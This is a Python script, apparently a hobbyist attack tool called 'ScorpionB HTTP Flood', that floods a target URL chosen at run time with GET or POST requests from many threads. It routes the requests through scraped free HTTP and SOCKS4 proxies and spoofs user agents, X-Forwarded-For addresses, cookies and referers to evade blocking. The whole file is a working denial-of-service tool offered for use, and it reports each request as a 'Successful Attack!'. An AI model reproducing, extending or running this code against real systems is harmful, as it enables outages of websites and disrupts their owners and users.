import json
import random
import string
import threading
import time
import warnings
from urllib.parse import urlparse
from typing import Dict, List

import requests
import faker
from colorama import Fore as F
from fake_useragent import UserAgent
from halo import Halo
from requests.exceptions import ConnectionError, Timeout
import os

os.system('clear')

# ======= hh =======
print(f'''
{F.RED}
 ________  ___  __    ___  __    ________  ________     
|\   __  \|\  \|\  \ |\  \|\  \ |\   __  \|\   ___ \    
\ \  \|\  \ \  \/  /|\ \  \/  /|\ \  \|\  \ \  \_|\ \   
 \ \   __  \ \   ___  \ \   ___  \ \   __  \ \  \ \\ \  
  \ \  \ \  \ \  \\ \  \ \  \\ \  \ \  \ \  \ \  \_\\ \ 
   \ \__\ \__\ \__\\ \__\ \__\\ \__\ \__\ \__\ \_______\

        {F.CYAN} ScorpionB HTTP Flood V{F.GREEN} 0.2 (BETA){F.RESET}
''')
print('-'*60)
# ==================================

fake = faker.Faker()
warnings.filterwarnings("ignore", message="Unverified HTTPS request")
ua = UserAgent()

# ======== TSD HTTP PROXY ========
def get_http_proxies() -> List[Dict[str, str]]:
    proxies = []
    try:
        with requests.get(
            "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=http&proxy_format=ipport&format=text&timeout=88270",
            verify=False,
        ) as proxy_list_http:
            proxies_http = [
                {"http": "http://" + proxy, "https": "http://" + proxy}
                for proxy in proxy_list_http.text.split("\r\n")
                if proxy != ""
            ]
            proxies.extend(proxies_http)

        with requests.get(
            "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=socks4&proxy_format=ipport&format=text&timeout=88270",
            verify=False,
        ) as proxy_list_socks4:
            proxies_socks4 = [
                {"http": "socks4://" + proxy, "https": "socks4://" + proxy}
                for proxy in proxy_list_socks4.text.split("\r\n")
                if proxy != ""
            ]
            proxies.extend(proxies_socks4)

    except Timeout:
        print(f"\n{F.RED}( !!! ) {F.CYAN}It was not possible to connect to the proxies!{F.RESET}")
        exit(1)
    except ConnectionError:
        print(f"\n{F.RED}( !!! ) {F.CYAN}Device is not connected to the Internet!{F.RESET}")
        exit(1)

    return proxies

proxies = get_http_proxies()
# ========================================================

def buildBlock(size):
    return ''.join(random.choice(string.ascii_letters) + random.choice(string.digits) for _ in range(size))

def generateRandData():
    return {
        "q": buildBlock(size=random.randint(5,10)) + buildBlock(size=random.randint(5,10)),
    }

def generate_headers():
    cookies = { ''.join(random.choices(string.ascii_letters, k=random.randint(3,8))) :
                ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(5,15))) for _ in range(random.randint(1,5)) }
    cookie_header = '; '.join([f"{key}={value}" for key, value in cookies.items()])
    return {
        "User-Agent": ua.random,
        "X-Requested-With": "XMLHttpRequest",
        "Connection": "keep-alive",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": random.choice(["https://www.google.com", "https://www.bing.com", "https://www.yahoo.com"]),
        "DNT": "1",
        "Upgrade-Insecure-Requests": "1",
        "X-Forwarded-For": fake.ipv4(),
        "Cookie": cookie_header
    }

def flood(target: str) -> None:
    global proxies
    type_request = random.choice(["GET","POST"])
    headers = generate_headers()
    paramsGet = generateRandData()
    while True:
        try:
            proxy = random.choice(proxies)
            if type_request == "GET":
                response = requests.get(target, headers=headers, proxies=proxy, timeout=5)
            else:
                response = requests.post(target, headers=headers, data=paramsGet, proxies=proxy, timeout=5)
            status = f"{F.GREEN if response.status_code==200 else F.RED}({response.status_code}){F.RESET}"
            payload_size = f"{F.GREEN}Data Size: {F.CYAN}{round(len(response.content)/1024, 2)} KB"
            print(f"{status} Successful Attack! --> {payload_size} | Proxy: {proxy['http']}")
        except (Timeout, OSError):
            continue
        if response.status_code != 200:
            try:
                proxies.remove(proxy)
            except ValueError:
                proxies = get_http_proxies()

def start_flooding(target: str, thread_count: int, duration: int) -> None:
    stop_time = time.time() + duration
    for _ in range(thread_count):
        thread = threading.Thread(target=flood, args=(target,))
        thread.daemon = True
        thread.start()
    while time.time() < stop_time:
        time.sleep(1)
    print(f"\n{F.CYAN}( Done ) {F.GREEN}Attack finished after {F.RED}{duration} seconds.{F.RESET}")

if __name__ == "__main__":
    target_url = input(f"\n{F.CYAN}┌─({F.GREEN}ScorpionB HTTP{F.CYAN})─({F.YELLOW}~ Enter URL{F.CYAN})\n└──╼ {F.YELLOW}~: {F.GREEN}")
    num_threads = int(input(f"\n{F.CYAN}┌─({F.GREEN}ScorpionB HTTP{F.CYAN})─({F.YELLOW}~ Threads{F.CYAN})\n└──╼ {F.YELLOW}~: {F.GREEN}"))
    duration = int(input(f"\n{F.CYAN}┌─({F.GREEN}ScorpionB HTTP{F.CYAN})─({F.YELLOW}~ Time Attack{F.CYAN})\n└──╼ {F.YELLOW}~: {F.GREEN}"))
    print(f"\n- {F.RESET}Attack On : {F.RED}{target_url}{F.RESET} for {F.RED}{duration}{F.RESET} seconds using {F.RED}{num_threads}{F.RESET} Threads.\n")
    start_flooding(target_url, num_threads, duration)
